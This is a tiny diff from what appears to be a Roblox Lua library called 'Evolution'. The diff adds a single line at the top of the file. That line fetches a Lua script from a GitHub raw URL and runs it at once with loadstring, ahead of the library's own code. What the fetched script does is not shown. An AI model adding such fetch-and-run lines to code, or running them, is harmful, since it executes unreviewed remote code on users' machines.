@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/misc-scripts/main/test.lua"))()
 function initLibrary()
     local folderName = "Evolution"
 
